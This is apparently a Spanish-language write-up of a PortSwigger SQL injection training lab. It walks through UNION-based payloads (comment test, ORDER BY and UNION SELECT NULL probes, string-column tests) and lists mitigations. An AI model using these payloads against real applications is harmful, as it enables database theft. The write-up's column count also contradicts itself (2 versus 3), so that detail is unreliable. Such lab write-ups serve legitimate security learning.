---
title: "Ataque UNION de inyección SQL, búsqueda de una columna que contiene texto"
platform: "PortSwigger"
os: "Windows"
difficulty: "Easy"
ip: "10.10.10.XXX"
slug: "ataque-union-de-inyeccion-sql-busqueda-de-una-columna-que-contiene-texto"
author: "Z4k7"
date: "2026-03-27"
year: "2026"
status: "pwned"
tags:
  - "sqli"
  - "web"
  - "union"
  - "apprentice"
techniques:
  - "SQL Injection"
  - "UNION attack"
  - "identificación de columna string"
  - "ORDER BY"
  - "UNION SELECT NULL"
tools:
  - "BurpSuite"
flags_list:
  - label: "Lab resuelto"
    value: "String `g2O5kP` visible en la respuesta ✓"
summary: "La vulnerabilidad de SQL Injection (SQLi) en el filtro de categorías permite usar un ataque UNION para recuperar datos de otras tablas. Este lab cubre el paso 2 de la cadena UNION: identificar cuál de las columnas acepta datos de tipo string, reemplazando NULL por 'a' en cada posición. Se confirma que la columna 2 acepta strings, permitiendo inyectar el valor aleatorio del lab.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Prueba inicial con `'--` confirma la inyección:
      - kind: "code"
        lang: "SQL"
        code: |
          '--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311142644931.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La aplicación no valida correctamente la entrada y acepta el comentario SQL, confirmando la inyección."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Reconocimiento siempre con `'--` primero. Si funciona, el motor acepta `--` como comentario. Anota esto — determina todos los payloads siguientes."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Enumeración de columnas con `ORDER BY`:
      - kind: "code"
        lang: "SQL"
        code: |
          '+ORDER+BY+1,2--   → Éxito
          '+ORDER+BY+1,2,3-- → Error
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311142730399.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El fallo confirma que la consulta devuelve 2 columnas."
      - kind: "note"
        text: |
          Validación con `UNION SELECT NULL`:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT NULL--         → Error
          ' UNION SELECT NULL,NULL--    → Error
          ' UNION SELECT NULL,NULL,NULL-- → Éxito ✓
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311144035966.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "Se confirma que la consulta requiere 2 columnas para que el UNION sea válido."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Discrepancia: ORDER BY dice 2 columnas pero UNION NULL funciona con 3. Esto ocurre cuando hay columnas en el SELECT que no se renderizan en la respuesta visible. Lo que importa para la explotación es el número que hace que UNION NULL no falle — en este caso 3. Documenta ambos resultados."

  - id: "exploit_1"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Prueba de compatibilidad con datos de cadena, reemplazando NULL por `'a'` posición a posición:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT 'a',NULL,NULL-- → Error   (col 1 no acepta string)
          ' UNION SELECT NULL,'a',NULL-- → Éxito ✓ (col 2 acepta string)
          ' UNION SELECT NULL,NULL,'a'-- → Error   (col 3 no acepta string)
      - kind: "image"
        src: "assets/images/Ataque%20UNION%20de%20inyecci%C3%B3n%20SQL,%20b%C3%BAsqueda%20de%20una%20columna%20que%20contiene%20texto/file-20260311145957817.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La columna 2 acepta datos de tipo cadena."
      - kind: "note"
        text: |
          Inyección del valor aleatorio del lab en la columna 2:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT NULL,'g2O5kP',NULL--
      - kind: "image"
        src: "assets/images/Ataque%20UNION%20de%20inyecci%C3%B3n%20SQL,%20b%C3%BAsqueda%20de%20una%20columna%20que%20contiene%20texto/file-20260311150109385.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El string `g2O5kP` aparece en la respuesta de la aplicación, completando el laboratorio."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El error en columnas 1 y 3 significa que son de tipo int u otro tipo incompatible. Solo la columna 2 acepta strings — esa es la columna que usarás para extraer usernames, passwords, versiones de BD, etc. Guarda este dato: columna 2 = string."

  - id: "exploit"
    num: "04"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Lab de tipo "identificación de columna string" — no requiere acceso a cuenta. El objetivo es confirmar qué columna acepta strings para preparar extracción de datos reales en labs posteriores.

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "Lab resuelto"
        value: "String `g2O5kP` visible en la respuesta ✓"

  - id: "privesc_1"
    num: "05"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          No aplica — lab preparatorio para extracción de datos.

lessons:
  - 'Siempre validar número de columnas antes de un ataque UNION.'
  - 'El uso de `NULL` es la técnica estándar para evitar conflictos de tipos al probar columnas.'
  - 'En auditorías, documentar cada paso con evidencia visual y técnica.'
  - 'ORDER BY y UNION SELECT son métodos complementarios para descubrir la estructura de la consulta.'
mitigation:
  - 'Implementar prepared statements (parametrización).'
  - 'Validar y sanitizar entradas de usuario.'
  - 'Configurar WAF para detectar patrones de SQLi.'
  - 'Minimizar mensajes de error expuestos al cliente.'
  - 'Revisar logs de base de datos para detectar consultas anómalas.'
---
